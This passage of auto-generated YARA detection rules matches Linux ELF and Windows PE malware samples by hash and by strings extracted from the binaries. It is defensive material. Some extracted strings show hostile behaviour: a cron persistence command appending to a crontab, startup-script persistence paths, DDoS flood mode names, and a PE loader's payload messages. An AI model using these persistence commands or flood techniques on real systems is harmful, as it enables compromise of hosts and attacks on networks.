      $s10 = "ync: negative WaitGroup counterresource temporarily unavailablenumerical argument out of domainsoftware caused connection abort:" ascii /* score: '10.00'*/
      $s11 = "untime: root level max pages = _cgo_pthread_key_created missingruntime: sudog with non-nil elemruntime: sudog with non-nil nextr" ascii /* score: '10.00'*/
      $s12 = "ubtle.XORBytes: invalid overlapinput overflows the modulus sizeinteger is not minimally encodedcannot represent time as UTCTimec" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b_36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a_63 {
   meta:
      description = "_subset_batch - from files 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash2 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash3 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash4 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
   strings:
      $x1 = "http: no Host in request URLEd25519 verification failureMultiple padding extensions!18189894035458564758300781259094947017729282" ascii /* score: '33.00'*/
      $s2 = "e hangupSIGWINCH: window size changecomparing uncomparable type runtime: bad lfnode address notewakeup - double wakeup (region e" ascii /* score: '21.00'*/
      $s3 = "edzero length explicit tag was not an asn1.Flagw must be at least 2 by the definition of NAFecho \"*/1 * * * * root /.mod \" >> " ascii /* score: '18.00'*/
      $s4 = "theworldtracebackancestorsadaptivestackstartgarbage collectionsync.RWMutex.RLockGC worker (active)stopping the worldbad lfnode a" ascii /* score: '18.00'*/
      $s5 = " setmspan.sweep: m is not lockedfound pointer to free objectmheap.freeSpanLocked - span fatal: morestack on gsignal" fullword ascii /* score: '17.00'*/
      $s6 = ", size = bad prune, tail = newosprocrecover:  not in [ctxt != 0, oldval=, newval= threads=: status= blocked= lockedg=atomicor8 r" ascii /* score: '16.50'*/
      $s7 = "untime= sigcode= m->curg=(unknown)traceback} stack=[ lockedm=%s %q: %sempty url#execwait/dev/nullcomplex64invalid nfuncargs(bad " ascii /* score: '16.50'*/
      $s8 = "enegotiationtls: internal error: failed to update binderscannot send after transport endpoint shutdowncontext: internal error: m" ascii /* score: '14.00'*/
      $s9 = "type:.eq.runtime.sysmontick" fullword ascii /* score: '11.00'*/
      $s10 = "Reader.UnreadByte: at beginning of sliceslice bounds out of range [:%x] with length %ypanicwrap: unexpected string after type na" ascii /* score: '10.00'*/
      $s11 = "C:/Program Files/Go/src/runtime/hash64.go" fullword ascii /* score: '10.00'*/
      $s12 = "g: ptr is nil and len is not zeroreflect: internal error: invalid method indexcrypto/rsa: message too long for RSA key sizex509:" ascii /* score: '10.00'*/
      $s13 = "sportinvalid request :path %q from URL.Opaque = %qnet/http: internal error: connCount underflowtls: internal error: unexpected r" ascii /* score: '10.00'*/
      $s14 = "ger from another goroutineruntime: failed mSpanList.remove span.npages=exitsyscall: syscall frame is no longer validunsafe.Strin" ascii /* score: '9.00'*/
      $s15 = " /OKiv25i), 000sTZ])|0|1??ip53->(\"\")) )" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_64 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash4 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash5 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
   strings:
      $s1 = "runtime.getfp" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.sysMmap" fullword ascii /* score: '14.00'*/
      $s3 = "runtime.sysMunmap" fullword ascii /* score: '14.00'*/
      $s4 = "internal/abi.(*IntArgRegBitmap).Get" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.munmap.func1" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.tracefpunwindoff" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.sigaction.func1" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.sigprofNonGoWrapper" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.mmap.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.unspillArgs" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.sigprofNonGo" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.fpTracebackPCs" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.spillArgs" fullword ascii /* score: '10.00'*/
      $s14 = "indexbody" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d_37c14ac6942e05caf18340201ab76c17220d446104349ec45_65 {
   meta:
      description = "_subset_batch - from files 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash2 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash3 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = " (normal) method: (MISSING)%!(EXTRA BigEndianrwxrwxrwxd.nx != 0underflowTRANSFORMPADDING_1PADDING_2InheritedquestionsClassINETAu" ascii /* score: '44.50'*/
      $x2 = " base exec: uint16uint32uint64stringstructchan<-<-chan ValueStringFormat[]byteCookieServerCommonspliceLengthheaderAnswercmd/goST" ascii /* score: '37.50'*/
      $x3 = " dst: 8.8.8.8:53 stream=%d:authorityset-cookieuser-agentConnectionkeep-aliveconnectionHost: %s" fullword ascii /* score: '35.50'*/
      $x4 = "types : type invaliduintptrfloat32float64SwapperChanDir Value>Ed25519MD2-RSAMD5-RSAserial:(PANIC=ExpiresSubjectSHA-224SHA-256SHA" ascii /* score: '31.00'*/
      $s5 = "thoritymath/randprintableomitemptyCloseProxyDeletelistStartProxyexsnn5ccvlUser-Agent/.ffff4444setenforcesystem.pubgateway.shdial" ascii /* score: '30.00'*/
      $s6 = "bitsNameTypeasn1tag:Begin/.cfgSHELL/.modmount/tmp/start--add $@);/d');:***@<nil>rangehttpscloseRange:path%s %qHTTP/Foundtls: %s-" ascii /* score: '24.50'*/
      $s7 = "bitsNameTypeasn1tag:Begin/.cfgSHELL/.modmount/tmp/start--add $@);/d');:***@<nil>rangehttpscloseRange:path%s %qHTTP/Foundtls: %s-" ascii /* score: '24.50'*/
      $s8 = "linuxMarchAprilmonthLocalchdirwritechmodgetwdpipe2lstathostsfilesimap2imap3imapspop3sdefersweepschedhchansudoggscanmheaptracepan" ascii /* score: '23.00'*/
      $s9 = " base exec: uint16uint32uint64stringstructchan<-<-chan ValueStringFormat[]byteCookieServerCommonspliceLengthheaderAnswercmd/goST" ascii /* score: '23.00'*/
      $s10 = "-384SHA-512SUCCESSINVALIDaccept4::ffff:answersos/execruntime2.5.4.62.5.4.32.5.4.52.5.4.72.5.4.82.5.4.9numericprivate#interndocum" ascii /* score: '20.00'*/
      $s11 = " ptrSize=  targetpc= until pc=unknown pcruntime: ggoroutine execerrdotcomplex128t.Kind == SHA256-RSASHA384-RSASHA512-RSADSA-SHA2" ascii /* score: '20.00'*/
      $s12 = "REETRemarksVersionnetstatserviceRefererCookie2 flags= len=%d:method:scheme:status (conn) %v=%v,expiresrefererrefreshtrailerTrail" ascii /* score: '18.50'*/
      $s13 = "SNETClassCHAOSAdditionalhttp2debugPOSTALCODE/usr/bin/ps/usr/bin/ss/usr/bin/ls/etc/init.dsystem.marknetstat.cfgupdate-rc.dread po" ascii /* score: '18.00'*/
      $s14 = "erUpgradechunkedCONNECTupgradeOPTIONSCreatedIM Used%s%s|%sHTTP/1.HEADERSderived. Got: 19531259765625abortedstoppedsignal Tuesday" ascii /* score: '16.00'*/
      $s15 = "stack=[ minutes etypes SHA1-RSADSA-SHA1x509sha1DNS nameRSV1 setRSV2 setRSV3 setbad MASKGoStringReceivedif-rangeMD5+SHA1SHA3-224S" ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53_6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931_66 {
   meta:
      description = "_subset_batch - from files 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash2 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash3 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296" ascii /* score: '66.50'*/
      $x2 = "crypto/rand: failed to read random data (see https://go.dev/issue/66821): tls: certificate RSA key size too small for supported " ascii /* score: '56.50'*/
      $s3 = "ialDualStackhttps://raw.githubusercontent.com/EDDYCJY/fake-useragent/v0.2.0/static/tls: server's certificate contains an unsuppo" ascii /* score: '26.00'*/
      $s4 = "e zeros unless AllowIllegalWrites is enabledhttp2: Transport conn %p received error from processing frame %v: %vhttp2: Transport" ascii /* score: '20.50'*/
      $s5 = "ing to unmarshal %q into %vexec: command with a non-nil Cancel was not created with CommandContextrange function recovered a loo" ascii /* score: '18.00'*/
      $s6 = " received unsolicited DATA frame; closing connectionhttp: message cannot contain multiple Content-Length headers; got %qAllThrea" ascii /* score: '18.00'*/
      $s7 = "tal pro 4.0::19971010::extensions to html 4.0//bytes.Buffer: UnreadByte: previous operation was not a successful readgot %s for " ascii /* score: '15.00'*/
      $s8 = "nature algorithmstls: handshake message of length %d bytes exceeds maximum of %d byteshttp2: Transport closing idle conn %p (for" ascii /* score: '13.00'*/
      $s9 = ":%d.0) Gecko/20100101 Firefox/%d.01157920892103562487626974469494075735300861434152903141955336313088670978539511157920892103562" ascii /* score: '12.00'*/
      $s10 = "ation (%T) returned a nil *Response with a nil errorcrypto/rand: blocked for 60 seconds waiting to read random data from the ker" ascii /* score: '10.00'*/
      $s11 = "-handshake message to QUIC transportcrypto/hmac: hash generation function does not produce unique valuespadding bytes must all b" ascii /* score: '10.00'*/
      $s12 = "40-only modex509: signature check attempts limit reached while verifying certificate chainnistec: internal error: p256AffineTabl" ascii /* score: '10.00'*/
      $s13 = "array with length %xtls: either ServerName or InsecureSkipVerify must be specified in the tls.Confighttp: RoundTripper implement" ascii /* score: '10.00'*/
      $s14 = "stream %d; expected CONTINUATION following %s for stream %dcrypto/ed25519: use of Ed25519ctx is not allowed in FIPS 140-only mod" ascii /* score: '9.50'*/
      $s15 = "SingleUse=%v, maxStream=%v)crypto/ecdh: only crypto/rand.Reader is allowed in FIPS 140-only modetoo many hex fields to fit an em" ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427_3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a_67 {
   meta:
      description = "_subset_batch - from files 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash2 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash3 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash4 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "(PANIC=float32float64runningandroidwindowsopenbsdoptionsconnectlookup writetoUpgradesocks5hHEADERSRefererCookie2expiresmax-age f" ascii /* score: '22.50'*/
      $s2 = "mode: Content-LengthPROTOCOL_ERRORINTERNAL_ERRORREFUSED_STREAMMAX_FRAME_SIZEERR_UNKNOWN_%daccept-charsetcontent-lengthread_frame" ascii /* score: '20.00'*/
      $s3 = " m=nil base OriginscriptchromesafariOrangeAcceptfor=%sX-HostapacheCF-RAYS%d.%d1.1 %ssid=%siphoneiPhonesocks4hangupkilled/proc/er" ascii /* score: '19.50'*/
      $s4 = "(PANIC=float32float64runningandroidwindowsopenbsdoptionsconnectlookup writetoUpgradesocks5hHEADERSRefererCookie2expiresmax-age f" ascii /* score: '18.00'*/
      $s5 = "types : type Mozillano-corsfirefoxComcastVerizonbrowserdiscordudp-rawudp-ppssyn-rawack-rawovh-mixhost=%svarnishhaproxyX-TimerWin" ascii /* score: '16.00'*/
      $s6 = "ock of unlocked rwmutexcorrupted semaphore ticketout of memory (stackalloc)invalid use of gostartcallshrinking stack in libcallr" ascii /* score: '14.00'*/
      $s7 = "http/1.1finishedomitzerodurationGoStringnetedns0[::1]:53unixgramtimeout:trust-adinvalid address raw-readsendfilereadfromhijacked" ascii /* score: '13.00'*/
      $s8 = "anRejangSyriacTai_LeTangsaTangutTeluguThaanaWanchoYezidi Value390625%s: %ssecretuint16uint32uint64structchan<-<-chanAnswer--%s" fullword ascii /* score: '12.50'*/
      $s9 = "lags= len=%d:method:scheme:status (conn) %v=%v,refererrefreshGODEBUGCONNECTchunkedname %qupgradeOPTIONSCreatedIM UsedHTTP/1. (tr" ascii /* score: '12.50'*/
      $s10 = "Receivedus-asciiif-rangeNO_PROXYno_proxyoverflowgo/typesnet/httpgo/buildfasthttpmac-os-xcomputerSHA2-256SHA2-512optionalexplicit" ascii /* score: '10.00'*/
      $s11 = "emplateempty integer.fasthttp.zstunsupported: HMAC-SHA2-256DownArrowBar;DownTeeArrow;ExponentialE;GreaterEqual;GreaterTilde;Hilb" ascii /* score: '10.00'*/
      $s12 = "dowsFirefoxsocks4ashadow-stoppedTuesdayJanuaryOctober-070000Z070000, time.AvestanBengaliBrailleCypriotDeseretElbasanElymaicGrant" ascii /* score: '9.00'*/
      $s13 = "SAPSSSSL_CERT_FILEemail addressshared_secretHKDF-SHA2-256dalTLDpSugct?name too longcrypto/subtlegocacheverifyinstallgoroothtml/t" ascii /* score: '9.00'*/
      $s14 = " flushGen  MB goal, s.state =  s.base()= heapGoal=GOMEMLIMIT KiB now,  pages at  sweepgen= sweepgen , bound = , limit =  returne" ascii /* score: '9.00'*/
      $s15 = "haHanunooKannadaMakasarMandaicMarchenMultaniMyanmarOsmanyaSharadaShavianSiddhamSinhalaSogdianSoyomboTagalogTibetanTirhutaAES-CBC" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1f_68 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash3 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii /* score: '36.50'*/
      $x2 = "invalid empty Content-Lengthnet/http: invalid trailer %shttp: no Host in request URLos: process already finishedos: process alre" ascii /* score: '36.00'*/
      $s3 = "proc/sys/net/ipv4/ip_local_port_rangetls: invalid ServerKeyExchange messageexpected an Ed25519 public key, got %Tinternal error:" ascii /* score: '19.00'*/
      $s4 = "e messagetls: internal error: unsupported curveafter decimal point in numeric literalflag %s set at %s before being definedfaile" ascii /* score: '18.00'*/
      $s5 = "d: internal error: shrinking natcrypto/rsa: unsupported hash functioncrypto/rsa: public exponent too largeexplicitly tagged memb" ascii /* score: '16.00'*/
      $s6 = "ime: bad lfnode address notewakeup - double wakeup (region exceeds uintptr range/gc/heap/frees-by-size:bytes/gc/heap/tiny/allocs" ascii /* score: '15.00'*/
      $s7 = "pending ASN.1 child too longreflect.MakeSlice: len > capmalformed MIME header line: /usr/local/share/mime/globs2invalid byte in " ascii /* score: '15.00'*/
      $s8 = "chunk lengthinvalid proxy address %q: %vabi.NewName: name too long: fips140: verified code+data" fullword ascii /* score: '12.50'*/
      $s9 = " unknown signature typetls: server selected unsupported grouptls: server selected unsupported curvetls: missing ServerKeyExchang" ascii /* score: '12.00'*/
      $s10 = "eeSpanLocked - span fatal: morestack on gsignal" fullword ascii /* score: '12.00'*/
      $s11 = "er didn't matchbisect.Hash: unexpected argument typeexpected identifier, found %c instead/proc/sys/net/ipv4/tcp_max_syn_backlog/" ascii /* score: '12.00'*/
      $s12 = "missing NULL parametersx509: invalid CRL distribution points%d chains with incompatible key usagechacha20poly1305: plaintext too" ascii /* score: '11.00'*/
      $s13 = "ady releasedSIGHUP: terminal line hangupSIGWINCH: window size changeGC mark assist wait for workcomparing uncomparable type runt" ascii /* score: '10.00'*/
      $s14 = " largegodebug: unexpected IncNonDefault of out does not point to an integer typecrypto/ecdh: invalid private key sizereflect: Bi" ascii /* score: '10.00'*/
      $s15 = ":objects/sched/goroutines:goroutinesgcBgMarkWorker: mode not setmspan.sweep: m is not lockedfound pointer to free objectmheap.fr" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _63d4a9b9eba532944ae2a220c057d409_imphash__6bde352c771d4958743bc28245c33758_imphash__69 {
   meta:
      description = "_subset_batch - from files 63d4a9b9eba532944ae2a220c057d409(imphash).exe, 6bde352c771d4958743bc28245c33758(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "aa4a2d1215f864481994234f13ab485b95150161b4566c180419d93dda7ac039"
      hash2 = "159471e1abc9adf6733af9d24781fbf27a776b81d182901c2e04e28f3fe2e6f3"
   strings:
      $s1 = "[-] Failed processing reloc field at: " fullword ascii /* score: '22.00'*/
      $s2 = "[ERROR] Loader/Payload bitness mismatch." fullword ascii /* score: '16.00'*/
      $s3 = "Invalid payload: " fullword ascii /* score: '13.00'*/
      $s4 = "[-] Not supported relocations format at %d: %d" fullword ascii /* score: '12.50'*/
      $s5 = "[!] Cannot fill imports into 32 bit PE via 64 bit loader!" fullword ascii /* score: '12.00'*/
      $s6 = "Could not allocate memory in the current process" fullword ascii /* score: '11.00'*/
      $s7 = "[-] VirtualAddress of section is out ouf bounds: " fullword ascii /* score: '11.00'*/
      $s8 = "[-] Section " fullword ascii /* score: '8.00'*/
      $s9 = "[-] Malformed field: %lx" fullword ascii /* score: '8.00'*/
      $s10 = "[-] Raw section size is out ouf bounds: " fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_70 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash4 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash5 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "/etc/profile.d/bash.cfg/usr/lib/libgdi.so.0.8.2 { proc_name=$(/usr/bin/unexpected buffer len=%vinvalid pseudo-header %qframe_hea" ascii /* score: '46.00'*/
      $x2 = "stack not a power of 2minpc or maxpc invalidtrace: alloc too largenon-Go function at pc=unexpected method stepreflect.Value.MapI" ascii /* score: '38.00'*/
      $s3 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"division by zer" ascii /* score: '28.00'*/
      $s4 = "ks availableidentifier removedmultihop attemptedRFS specific errorstreams pipe errorconnection refusedoperation canceledsegmenta" ascii /* score: '21.00'*/
      $s5 = "Already ReportedMultiple ChoicesPayment RequiredUpgrade RequiredContent-Length: SETTINGS_TIMEOUTFRAME_SIZE_ERRORSignatureScheme(" ascii /* score: '19.00'*/
      $s6 = "pected messageexport restrictionvalue out of range298023223876953125input/output errorno child processesfile name too longno loc" ascii /* score: '18.00'*/
      $s7 = "lableTime.UnmarshalBinary: no dataio: read/write on closed pipemismatched local address typeunknown IP protocol specifiedSIGPIPE" ascii /* score: '15.00'*/
      $s8 = "sult out of rangemachine is not on the networkprotocol family not supportedoperation already in progressno XENIX semaphores avai" ascii /* score: '15.00'*/
      $s9 = "receive (nil chan)garbage collection scanSIGIO: i/o now possibleSIGSYS: bad system callmakechan: bad alignmentclose of closed ch" ascii /* score: '11.00'*/
      $s10 = "terrupted system calldevice or resource busyno space left on deviceoperation not supportedCPU time limit exceededprofiling timer" ascii /* score: '11.00'*/
      $s11 = "no route to hostremote I/O errorstopped (signal)time: bad [0-9]*context canceled.WithValue(type hostLookupOrder=/etc/resolv.conf" ascii /* score: '11.00'*/
      $s12 = " expiredbytes.Buffer: too largeunexpected address typemissing port in addressindex out of range [%x]ReadMemStatsSlow (test)chan " ascii /* score: '10.00'*/
      $s13 = "ink number out of rangeout of streams resourcesconnection reset by peerstructure needs cleaningfloating point exceptionfile size" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d_37c14ac6942e05caf18340201ab76c17220d446104349ec45_71 {
   meta:
      description = "_subset_batch - from files 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash2 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash3 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash4 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash5 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "runtime.fge64" fullword ascii /* score: '10.00'*/
      $s2 = "runtime.funpack32" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.fdiv64" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.fpack64" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.fcmp64" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.divlu" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.fintto64" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.funpack64" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.fint32to64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.fadd64" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.feq64" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.feq32" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.fmul64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fpack32" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.mullu" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11_72 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash3 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash4 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash5 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
